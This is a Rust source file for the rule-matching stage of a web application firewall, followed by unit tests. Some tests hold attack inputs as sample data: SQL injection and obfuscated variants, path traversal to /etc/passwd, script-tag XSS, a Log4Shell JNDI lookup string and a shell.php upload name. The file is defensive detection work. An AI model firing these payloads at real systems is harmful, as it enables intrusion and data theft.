//! Stage 11: the judge. One request in, one verdict out, no I/O.
//!
//! `docs/design.md` "段階11 WAF". The server (`server.rs`) reads a request off
//! the wire and hands it here; `waf-test` hands it the same way from a corpus
//! file, so what is tested is what runs.
//!
//! A request is cut into *values* (the path, each query name and value, each
//! body field, each header, each cookie, the user agent, each upload file
//! name). Each value is normalized and read by the rules that apply to where it
//! came from. A rule counts once per request, however many values it hits; the
//! score is the sum of the distinct rules' severities.

use serde_json::Value;

use super::normalize::{normalize_value, Normalized};
use super::rules::{meta, Location, RuleSet, Severity};

/// Most values read from one request.
pub const MAX_VALUES: usize = 2048;
/// Deepest JSON nesting read.
pub const MAX_JSON_DEPTH: usize = 32;
/// Most multipart parts read.
pub const MAX_PARTS: usize = 256;
/// Longest `Authorization` header value before rule 943110.
pub const MAX_AUTHORIZATION: usize = 4096;

/// One request, owned, as the judge reads it.
#[derive(Debug, Clone, Default)]
pub struct Request {
    pub method: String,
    /// The request target's path, still percent-encoded.
    pub path: String,
    /// The query string without the `?`, still percent-encoded.
    pub query: String,
    pub headers: Vec<(String, String)>,
    /// The body, cut at `--max-body-inspect`.
    pub body: Vec<u8>,
    /// The body was longer than what `body` holds.
    pub body_truncated: bool,
    pub http11: bool,
}

/// What to enforce.
#[derive(Debug, Clone, Copy)]
pub struct Policy {
    pub paranoia: u8,
    pub threshold: u32,
}

/// One rule that fired.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hit {
    pub id: u32,
    pub at: Location,
    pub severity: Severity,
}

/// What the judge decided.
#[derive(Debug, Clone, Default)]
pub struct Verdict {
    pub score: u32,
    pub hits: Vec<Hit>,
    /// Facts about the inspection itself (`body_truncated`, `json_depth`, ...).
    pub flags: Vec<&'static str>,
    pub over_threshold: bool,
}

/// A rule switched off for a place (the only way to rescue a false positive).
#[derive(Debug, Clone)]
pub struct Exclusion {
    pub rule: u32,
    pub path_prefix: String,
    pub at: Option<Location>,
    pub method: Option<String>,
}

impl Exclusion {
    fn covers(&self, req: &Request, id: u32, at: Location) -> bool {
        self.rule == id
            && req.path.starts_with(&self.path_prefix)
            && self.at.is_none_or(|only| only == at)
            && self
                .method
                .as_deref()
                .is_none_or(|m| m.eq_ignore_ascii_case(&req.method))
    }
}

/// Facts the normalizer saw, summed over a request.
#[derive(Default)]
struct Seen {
    nul: Option<Location>,
    overflow: Option<Location>,
    bad_utf8: Option<Location>,
}

impl Seen {
    fn note(&mut self, at: Location, n: &Normalized) {
        if n.nul && self.nul.is_none() {
            self.nul = Some(at);
        }
        if n.overflow && self.overflow.is_none() {
            self.overflow = Some(at);
        }
        if n.bad_utf8 && self.bad_utf8.is_none() {
            self.bad_utf8 = Some(at);
        }
    }
}

/// Everything collected while reading one request.
struct Run<'a> {
    req: &'a Request,
    set: &'a RuleSet,
    policy: Policy,
    exclusions: &'a [Exclusion],
    hits: Vec<Hit>,
    flags: Vec<&'static str>,
    seen: Seen,
    values: usize,
}

impl Run<'_> {
    fn flag(&mut self, name: &'static str) {
        if !self.flags.contains(&name) {
            self.flags.push(name);
        }
    }

    fn excluded(&self, id: u32, at: Location) -> bool {
        self.exclusions.iter().any(|e| e.covers(self.req, id, at))
    }

    fn already(&self, id: u32) -> bool {
        self.hits.iter().any(|h| h.id == id)
    }

    /// Read one raw value that arrived at `at`.
    fn value(&mut self, at: Location, raw: &[u8], plus_as_space: bool) {
        if self.values >= MAX_VALUES {
            self.flag("values_capped");
            return;
        }
        self.values += 1;
        let n = normalize_value(raw, plus_as_space);
        self.seen.note(at, &n);
        self.apply(at, &n.text);
    }

    /// Run the rules of `at` over already-normalized text.
    fn apply(&mut self, at: Location, text: &str) {
        let set = self.set;
        for rule in set.for_location(at, self.policy.paranoia) {
            if self.already(rule.id) || !rule.matches(text) || self.excluded(rule.id, at) {
                continue;
            }
            self.hits.push(Hit {
                id: rule.id,
                at,
                severity: rule.severity,
            });
        }
    }

    fn meta_hit(&mut self, id: u32, at: Location) {
        let (Some(severity), Some(paranoia)) = (meta::severity_of(id), meta::paranoia_of(id))
        else {
            return;
        };
        if paranoia > self.policy.paranoia || self.already(id) || self.excluded(id, at) {
            return;
        }
        self.hits.push(Hit { id, at, severity });
    }
}

/// Split `name=value` at the first `=`. A pair with no `=` is a name alone,
/// and its value is the empty string.
fn split_pair(pair: &str) -> (&str, &str) {
    match pair.split_once('=') {
        Some(found) => found,
        // DEFAULT: a pair without `=` is a name with an empty value (WHATWG URL form parsing, RFC 6265 section 5.2).
        None => (pair, ""),
    }
}

fn read_urlencoded(run: &mut Run<'_>, at: Location, text: &str) {
    for pair in text.split('&').filter(|p| !p.is_empty()) {
        let (name, value) = split_pair(pair);
        run.value(at, name.as_bytes(), true);
        run.value(at, value.as_bytes(), true);
    }
}

fn read_json(run: &mut Run<'_>, body: &[u8]) {
    let Ok(root) = serde_json::from_slice::<Value>(body) else {
        run.flag("json_unparsed");
        run.value(Location::Body, body, false);
        return;
    };
    let mut stack: Vec<(&Value, usize)> = vec![(&root, 0)];
    while let Some((node, depth)) = stack.pop() {
        if depth > MAX_JSON_DEPTH {
            run.flag("json_depth");
            run.value(Location::Body, node.to_string().as_bytes(), false);
            continue;
        }
        match node {
            Value::String(s) => run.value(Location::Body, s.as_bytes(), false),
            Value::Array(items) => stack.extend(items.iter().map(|v| (v, depth + 1))),
            Value::Object(map) => {
                for (key, value) in map {
                    run.value(Location::Body, key.as_bytes(), false);
                    stack.push((value, depth + 1));
                }
            }
            Value::Number(n) => run.value(Location::Body, n.to_string().as_bytes(), false),
            Value::Bool(_) | Value::Null => {}
        }
    }
}

/// A multipart part.
struct Part<'a> {
    name: Option<String>,
    filename: Option<String>,
    binary: bool,
    data: &'a [u8],
}

fn find(hay: &[u8], needle: &[u8], from: usize) -> Option<usize> {
    if needle.is_empty() || from >= hay.len() {
        return None;
    }
    hay[from..]
        .windows(needle.len())
        .position(|w| w == needle)
        .map(|p| p + from)
}

/// The value of `key="..."` (or `key=token`) in a header parameter list.
fn param(header: &str, key: &str) -> Option<String> {
    let lower = header.to_ascii_lowercase();
    let needle = format!("{key}=");
    let mut from = 0;
    while let Some(at) = lower[from..].find(&needle) {
        let start = from + at;
        let boundary_ok = start == 0 || matches!(lower.as_bytes()[start - 1], b' ' | b';' | b'\t');
        if boundary_ok {
            let rest = &header[start + needle.len()..];
            return match rest.strip_prefix('"') {
                Some(quoted) => quoted.split('"').next().map(str::to_owned),
                None => rest.split(';').next().map(|s| s.trim().to_owned()),
            };
        }
        from = start + needle.len();
    }
    None
}

fn multipart_parts<'a>(body: &'a [u8], boundary: &str) -> Vec<Part<'a>> {
    let delimiter = format!("--{boundary}");
    let mut parts = Vec::new();
    let mut at = find(body, delimiter.as_bytes(), 0);
    while let Some(start) = at {
        if parts.len() >= MAX_PARTS {
            break;
        }
        let head_from = start + delimiter.len();
        if body.get(head_from..head_from + 2) == Some(b"--") {
            break;
        }
        let next = find(body, delimiter.as_bytes(), head_from);
        let end = match next {
            Some(found) => found,
            None => body.len(),
        };
        if let Some(part) = one_part(&body[head_from..end]) {
            parts.push(part);
        }
        at = next;
    }
    parts
}

/// Drop one leading `prefix` if present.
fn without_prefix<'a>(bytes: &'a [u8], prefix: &[u8]) -> &'a [u8] {
    match bytes.strip_prefix(prefix) {
        Some(rest) => rest,
        None => bytes,
    }
}

/// Drop one trailing `suffix` if present.
fn without_suffix<'a>(bytes: &'a [u8], suffix: &[u8]) -> &'a [u8] {
    match bytes.strip_suffix(suffix) {
        Some(rest) => rest,
        None => bytes,
    }
}

fn one_part(chunk: &[u8]) -> Option<Part<'_>> {
    let chunk = without_prefix(chunk, b"\r\n");
    let split = find(chunk, b"\r\n\r\n", 0)?;
    let head = String::from_utf8_lossy(&chunk[..split]).into_owned();
    let data = without_suffix(&chunk[split + 4..], b"\r\n");
    let mut name = None;
    let mut filename = None;
    let mut binary = false;
    for line in head.lines() {
        let lower = line.to_ascii_lowercase();
        if lower.starts_with("content-disposition:") {
            name = param(line, "name");
            filename = param(line, "filename");
        } else if let Some(kind) = lower.strip_prefix("content-type:") {
            let kind = kind.trim();
            binary = !(kind.starts_with("text/")
                || kind.contains("json")
                || kind.contains("xml")
                || kind.contains("x-www-form-urlencoded"));
        }
    }
    Some(Part {
        name,
        filename,
        binary,
        data,
    })
}

fn read_multipart(run: &mut Run<'_>, content_type: &str, body: &[u8]) {
    let Some(boundary) = param(content_type, "boundary") else {
        run.flag("multipart_no_boundary");
        run.value(Location::Body, body, false);
        return;
    };
    for part in multipart_parts(body, &boundary) {
        if let Some(name) = &part.name {
            run.value(Location::Body, name.as_bytes(), false);
        }
        if let Some(file) = &part.filename {
            run.value(Location::Filename, file.as_bytes(), false);
        }
        if part.filename.is_none() || !part.binary {
            run.value(Location::Body, part.data, false);
        }
    }
}

fn header_value<'a>(req: &'a Request, name: &str) -> Option<&'a str> {
    req.headers
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case(name))
        .map(|(_, v)| v.as_str())
}

fn read_body(run: &mut Run<'_>) {
    let req = run.req;
    if req.body.is_empty() {
        return;
    }
    if req.body_truncated {
        run.flag("body_truncated");
    }
    let Some(original) = header_value(req, "content-type") else {
        run.value(Location::Body, &req.body, false);
        return;
    };
    let kind = original.to_ascii_lowercase();
    if kind.starts_with("application/x-www-form-urlencoded") {
        let text = String::from_utf8_lossy(&req.body).into_owned();
        read_urlencoded(run, Location::Body, &text);
    } else if kind.contains("json") {
        read_json(run, &req.body);
    } else if kind.starts_with("multipart/") {
        read_multipart(run, original, &req.body);
    } else {
        run.value(Location::Body, &req.body, false);
    }
}

fn read_headers(run: &mut Run<'_>) {
    let req = run.req;
    for (name, value) in &req.headers {
        let lower = name.to_ascii_lowercase();
        match lower.as_str() {
            "content-length" | "transfer-encoding" | "connection" => {}
            "cookie" => read_cookie(run, value),
            "user-agent" => run.value(Location::UserAgent, value.as_bytes(), false),
            _ => {
                if lower == "authorization" && value.len() > MAX_AUTHORIZATION {
                    run.meta_hit(meta::HEADER_TOO_LONG, Location::Header);
                }
                let line = format!("{lower}: {value}");
                run.value(Location::Header, line.as_bytes(), false);
            }
        }
    }
}

fn read_cookie(run: &mut Run<'_>, value: &str) {
    for pair in value.split(';').map(str::trim).filter(|p| !p.is_empty()) {
        let (name, val) = split_pair(pair);
        run.value(Location::Cookie, name.as_bytes(), false);
        run.value(Location::Cookie, val.as_bytes(), false);
    }
}

fn raise_meta(run: &mut Run<'_>) {
    if let Some(at) = run.seen.nul {
        run.meta_hit(meta::NUL_BYTE, at);
    }
    if let Some(at) = run.seen.overflow {
        run.meta_hit(meta::DECODE_OVERFLOW, at);
    }
    if let Some(at) = run.seen.bad_utf8 {
        run.meta_hit(meta::BAD_UTF8, at);
    }
    if run.req.http11 && header_value(run.req, "host").is_none() {
        run.meta_hit(meta::NO_HOST, Location::Header);
    }
}

/// Judge one request.
pub fn inspect(req: &Request, set: &RuleSet, policy: Policy, exclusions: &[Exclusion]) -> Verdict {
    let mut run = Run {
        req,
        set,
        policy,
        exclusions,
        hits: Vec::new(),
        flags: Vec::new(),
        seen: Seen::default(),
        values: 0,
    };
    run.value(Location::Path, req.path.as_bytes(), false);
    read_urlencoded(&mut run, Location::Query, &req.query);
    read_headers(&mut run);
    read_body(&mut run);
    raise_meta(&mut run);
    let score = run.hits.iter().map(|h| h.severity.score()).sum();
    Verdict {
        score,
        over_threshold: score >= policy.threshold,
        hits: run.hits,
        flags: run.flags,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    type TestResult = Result<(), Box<dyn std::error::Error>>;

    const POLICY: Policy = Policy {
        paranoia: 1,
        threshold: 5,
    };

    fn get(path: &str, query: &str) -> Request {
        Request {
            method: "GET".into(),
            path: path.into(),
            query: query.into(),
            headers: vec![("Host".into(), "example.test".into())],
            http11: true,
            ..Request::default()
        }
    }

    fn post(content_type: &str, body: &[u8]) -> Request {
        let mut req = get("/submit", "");
        req.method = "POST".into();
        req.headers.push(("Content-Type".into(), content_type.into()));
        req.body = body.to_vec();
        req
    }

    fn judge(req: &Request) -> Result<Verdict, Box<dyn std::error::Error>> {
        Ok(inspect(req, &RuleSet::builtin_only()?, POLICY, &[]))
    }

    fn ids(v: &Verdict) -> Vec<u32> {
        v.hits.iter().map(|h| h.id).collect()
    }

    #[test]
    fn a_plain_request_scores_zero() -> TestResult {
        let v = judge(&get("/shop/items", "q=blue+shoes&page=2"))?;
        assert_eq!(v.score, 0);
        assert!(v.hits.is_empty() && !v.over_threshold);
        Ok(())
    }

    #[test]
    fn a_union_select_in_the_query_goes_over() -> TestResult {
        let v = judge(&get("/", "q=1%27%20union%20select%20password%20from%20users--"))?;
        assert!(v.over_threshold);
        assert!(ids(&v).contains(&942_100));
        Ok(())
    }

    #[test]
    fn double_encoding_does_not_hide_a_payload() -> TestResult {
        let v = judge(&get("/", "q=%2527%2520union%2520select%25201"))?;
        assert!(ids(&v).contains(&942_100));
        Ok(())
    }

    #[test]
    fn a_sql_comment_between_words_does_not_hide_a_payload() -> TestResult {
        let v = judge(&get("/", "q=1/**/UnIoN/**/SeLeCt/**/2"))?;
        assert!(ids(&v).contains(&942_100));
        Ok(())
    }

    #[test]
    fn traversal_in_the_path_is_found_after_decoding() -> TestResult {
        let v = judge(&get("/files/..%2f..%2fetc/passwd", ""))?;
        assert!(v.over_threshold, "{:?}", ids(&v));
        Ok(())
    }

    #[test]
    fn a_rule_counts_once_however_many_values_hit_it() -> TestResult {
        let q = "a=%3Cscript%3E&b=%3Cscript%3E&c=%3Cscript%3E";
        let v = judge(&get("/", q))?;
        assert_eq!(ids(&v).iter().filter(|i| **i == 941_100).count(), 1);
        let from_hits: u32 = v.hits.iter().map(|h| h.severity.score()).sum();
        assert_eq!(v.score, from_hits);
        Ok(())
    }

    #[test]
    fn a_nul_byte_is_a_critical_hit() -> TestResult {
        let v = judge(&get("/", "q=a%00b"))?;
        assert!(ids(&v).contains(&meta::NUL_BYTE));
        assert!(v.over_threshold);
        Ok(())
    }

    #[test]
    fn four_layers_of_encoding_are_a_critical_hit() -> TestResult {
        let v = judge(&get("/", "q=%25252527"))?;
        assert!(ids(&v).contains(&meta::DECODE_OVERFLOW));
        Ok(())
    }

    #[test]
    fn invalid_utf8_is_a_warning_and_does_not_block_alone() -> TestResult {
        let v = judge(&get("/", "q=%ff%fe"))?;
        assert!(ids(&v).contains(&meta::BAD_UTF8));
        assert!(!v.over_threshold);
        Ok(())
    }

    #[test]
    fn http11_without_host_is_a_warning() -> TestResult {
        let mut req = get("/", "");
        req.headers.clear();
        let v = judge(&req)?;
        assert!(ids(&v).contains(&meta::NO_HOST));
        req.http11 = false;
        assert!(!ids(&judge(&req)?).contains(&meta::NO_HOST));
        Ok(())
    }

    #[test]
    fn a_scanner_user_agent_is_a_warning_and_does_not_block_alone() -> TestResult {
        let mut req = get("/", "");
        req.headers
            .push(("User-Agent".into(), "sqlmap/1.7.2#stable".into()));
        let v = judge(&req)?;
        assert_eq!(ids(&v), vec![913_100]);
        assert!(!v.over_threshold);
        Ok(())
    }

    #[test]
    fn log4shell_in_a_header_is_found() -> TestResult {
        let mut req = get("/", "");
        req.headers
            .push(("X-Api-Version".into(), "${jndi:ldap://e.test/a}".into()));
        assert!(judge(&req)?.over_threshold);
        Ok(())
    }

    #[test]
    fn a_cookie_value_is_read() -> TestResult {
        let mut req = get("/", "");
        req.headers
            .push(("Cookie".into(), "sid=abc; theme=<script>x</script>".into()));
        assert!(ids(&judge(&req)?).contains(&941_100));
        Ok(())
    }

    #[test]
    fn an_overlong_authorization_header_is_a_warning() -> TestResult {
        let mut req = get("/", "");
        req.headers
            .push(("Authorization".into(), "A".repeat(MAX_AUTHORIZATION + 1)));
        assert!(ids(&judge(&req)?).contains(&meta::HEADER_TOO_LONG));
        Ok(())
    }

    #[test]
    fn a_urlencoded_body_is_read_like_a_query() -> TestResult {
        let v = judge(&post(
            "application/x-www-form-urlencoded",
            b"user=a&pw=%27+or+1%3D1",
        ))?;
        assert!(v.over_threshold);
        Ok(())
    }

    #[test]
    fn json_keys_and_nested_leaves_are_read() -> TestResult {
        let body = br#"{"a":{"b":[1,{"c":"<script>x</script>"}]}}"#;
        assert!(judge(&post("application/json", body))?.over_threshold);
        let key = br#"{"1 union select 2":1}"#;
        assert!(judge(&post("application/json; charset=utf-8", key))?.over_threshold);
        Ok(())
    }

    #[test]
    fn json_that_does_not_parse_is_read_raw_and_flagged() -> TestResult {
        let v = judge(&post("application/json", b"{\"a\": <script>"))?;
        assert!(v.flags.contains(&"json_unparsed"));
        assert!(v.over_threshold);
        Ok(())
    }

    #[test]
    fn json_nested_past_the_limit_is_flagged() -> TestResult {
        let deep = format!("{}1{}", "[".repeat(40), "]".repeat(40));
        let v = judge(&post("application/json", deep.as_bytes()))?;
        assert!(v.flags.contains(&"json_depth"));
        Ok(())
    }

    const BOUNDARY: &str = "multipart/form-data; boundary=XyZ";

    fn multipart(parts: &[(&str, &str, &str)]) -> Vec<u8> {
        let mut out = Vec::new();
        for (disposition, kind, data) in parts {
            out.extend_from_slice(b"--XyZ\r\n");
            out.extend_from_slice(format!("Content-Disposition: {disposition}\r\n").as_bytes());
            if !kind.is_empty() {
                out.extend_from_slice(format!("Content-Type: {kind}\r\n").as_bytes());
            }
            out.extend_from_slice(b"\r\n");
            out.extend_from_slice(data.as_bytes());
            out.extend_from_slice(b"\r\n");
        }
        out.extend_from_slice(b"--XyZ--\r\n");
        out
    }

    #[test]
    fn a_multipart_field_value_is_read() -> TestResult {
        let body = multipart(&[("form-data; name=\"q\"", "", "1' or 1=1")]);
        assert!(judge(&post(BOUNDARY, &body))?.over_threshold);
        Ok(())
    }

    #[test]
    fn a_multipart_file_name_is_read_and_binary_content_is_not() -> TestResult {
        let body = multipart(&[(
            "form-data; name=\"f\"; filename=\"shell.php\"",
            "application/octet-stream",
            "<script>x</script>",
        )]);
        let v = judge(&post(BOUNDARY, &body))?;
        assert!(ids(&v).contains(&944_100));
        assert!(!ids(&v).contains(&941_100));
        Ok(())
    }

    #[test]
    fn a_text_upload_content_is_read() -> TestResult {
        let body = multipart(&[(
            "form-data; name=\"f\"; filename=\"note.txt\"",
            "text/plain",
            "<script>x</script>",
        )]);
        assert!(ids(&judge(&post(BOUNDARY, &body))?).contains(&941_100));
        Ok(())
    }

    #[test]
    fn a_multipart_without_a_boundary_is_flagged() -> TestResult {
        let v = judge(&post("multipart/form-data", b"abc"))?;
        assert!(v.flags.contains(&"multipart_no_boundary"));
        Ok(())
    }

    #[test]
    fn a_truncated_body_is_flagged() -> TestResult {
        let mut req = post("text/plain", b"hello");
        req.body_truncated = true;
        assert!(judge(&req)?.flags.contains(&"body_truncated"));
        Ok(())
    }

    #[test]
    fn an_exclusion_switches_one_rule_off_for_one_place() -> TestResult {
        let set = RuleSet::builtin_only()?;
        let req = get("/api/search", "q=1+union+select+2");
        let ex = Exclusion {
            rule: 942_100,
            path_prefix: "/api/search".into(),
            at: Some(Location::Query),
            method: Some("get".into()),
        };
        assert!(!ids(&inspect(&req, &set, POLICY, std::slice::from_ref(&ex))).contains(&942_100));
        let other = get("/api/other", "q=1+union+select+2");
        assert!(ids(&inspect(&other, &set, POLICY, std::slice::from_ref(&ex))).contains(&942_100));
        let wrong_place = Exclusion {
            at: Some(Location::Body),
            ..ex
        };
        assert!(ids(&inspect(&req, &set, POLICY, &[wrong_place])).contains(&942_100));
        Ok(())
    }

    #[test]
    fn a_higher_paranoia_level_adds_rules() -> TestResult {
        let set = RuleSet::builtin_only()?;
        let req = get("/", "q=select+name+from+users");
        let one = inspect(&req, &set, POLICY, &[]);
        let two = inspect(
            &req,
            &set,
            Policy {
                paranoia: 2,
                ..POLICY
            },
            &[],
        );
        assert!(!ids(&one).contains(&942_170));
        assert!(ids(&two).contains(&942_170));
        Ok(())
    }

    #[test]
    fn the_threshold_is_where_the_verdict_turns() -> TestResult {
        let set = RuleSet::builtin_only()?;
        let req = get("/", "q=javascript:void");
        let low = inspect(
            &req,
            &set,
            Policy {
                threshold: 3,
                ..POLICY
            },
            &[],
        );
        let high = inspect(&req, &set, POLICY, &[]);
        assert_eq!(low.score, 3);
        assert!(low.over_threshold && !high.over_threshold);
        Ok(())
    }

    #[test]
    fn the_value_count_is_capped() -> TestResult {
        let q: Vec<String> = (0..MAX_VALUES + 50).map(|i| format!("k{i}=v")).collect();
        let v = judge(&get("/", &q.join("&")))?;
        assert!(v.flags.contains(&"values_capped"));
        Ok(())
    }

    #[test]
    fn an_empty_request_is_judged_without_hits() -> TestResult {
        let v = judge(&Request::default())?;
        assert_eq!(v.score, 0);
        Ok(())
    }

    #[test]
    fn a_pair_without_equals_is_a_name_with_an_empty_value() {
        assert_eq!(split_pair("a=b=c"), ("a", "b=c"));
        assert_eq!(split_pair("a"), ("a", ""));
        assert_eq!(split_pair(""), ("", ""));
    }
}
